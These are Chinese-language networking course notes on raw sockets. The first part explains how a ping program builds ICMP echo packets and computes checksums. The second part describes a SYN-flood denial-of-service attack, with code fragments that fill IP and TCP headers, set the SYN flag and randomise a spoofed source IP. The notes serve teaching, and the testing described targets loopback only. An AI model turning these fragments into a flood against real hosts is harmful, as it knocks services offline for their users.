# 为计算机网络的理论做铺垫
- 基于原始套接字

# ping.c

1. 创建原始的套接字 
- sudo ./myping www.
- 系统自带不用sudo 虽然普通用户不能访问，但当前进程有访问权限

2. ping用户态通过系统调用进入核态
- ping 数据发送和接受，没有应用层协议
- 没有运输层没有tcp/udp，直接网络层ip协议
- ip 不可靠(icmp 网络层协议的辅助协议)
- 协议主要体现在首部格式，数据包 echo_request
- 数据包 data ping的用户决定的
- ip首部+icmp首部
- 数据链路针头针尾由网卡决定
- (icmp首部+ data)  我们填的 还会天一阁send-time
- echo-reply
- recv-time
- rtt=接收到的  recv-time - 读取到的
- ttl 在 ip 里面


3. 创建套接字 发包 
- protocol->p_proto 使用icmp的协议
- /* 回收root权限,设置当前用户权限*/   setuid(getuid()); 降低为普通用户

- 缓存太小 int size=50*1024; 50k
- pid 写在了icmp的首部发出去， 到时候返回的时候就知道是哪个服务器的echo-reply

4. send_packet() 核心 封装包
5. pack
icmp=(struct icmp*)sendpacket;
        icmp->icmp_type=ICMP_ECHO; // icmp协议的类型
        icmp->icmp_code=0; // 子类型
        icmp->icmp_cksum=0; // 校验和
        icmp->icmp_seq=pack_no; // 序列号
        icmp->icmp_id=pid; // 进程id
        // 8个字节干啥用的，5个字段
        packsize=8+datalen;

icmp->icmp_cksum=cal_chksum( (unsigned short *)icmp,packsize); /*校验算法*/
- 划分16位相加 一只加到没有进位为止(最多两次)，最后的反码作为校验位
- 计算机网络很抽象的内容
6. 主要是封装包和计网的协议有关，以及为什么这样解封
- 计网的本质

# dos攻击
- ifconfig 没上网只攻击自己的环回地址
- 127.0.0.1
1. tcp 
2. ip
- stream套接字操作系统帮你填了真实的，所以用真实套接字来写虚拟的ip
- dos就是不发数据疯狂链接，把listen的监听通道占满了，正常的请求就没发链接了
3. ip+tcp+data  组装成一个包syn=1无限发
- /******** 填充IP数据包的头部,还记得IP的头格式吗? ******/ 
ip=(struct ip *)buffer; 
ip->ip_v=IPVERSION; /** 版本一般的是 4 **/ 
ip->ip_hl=sizeof(struct ip)>>2; /** IP数据包的头部长度 **/ 
ip->ip_tos=0; /** 服务类型 **/ 
ip->ip_len=htons(head_len); /** IP数据包的长度 **/ 
ip->ip_id=0; /** 让系统去填写吧 **/ 
ip->ip_off=0; /** 和上面一样,省点时间 **/ 
ip->ip_ttl=MAXTTL; /** 最长的时间 255 **/ 
ip->ip_p=IPPROTO_TCP; /** 我们要发的是 TCP包 **/ 
ip->ip_sum=0; /** 校验和让系统去做 **/ 
ip->ip_dst=addr->sin_addr; /** 我们攻击的对象 **/ 
- 要考这些字段是干啥的
- /******* 开始填写TCP数据包 *****/ 
tcp=(struct tcphdr *)(buffer +sizeof(struct ip)); 
tcp->source=htons(LOCALPORT); 
tcp->dest=addr->sin_port; /** 目的端口 **/ 
tcp->seq=random(); 
tcp->ack_seq=0; 
tcp->doff=5; 
tcp->syn=1; /** 我要建立连接 **/    第一次握手信息
tcp->check=0; 

4. ip->ip_src.s_addr=random();  产生随机ip


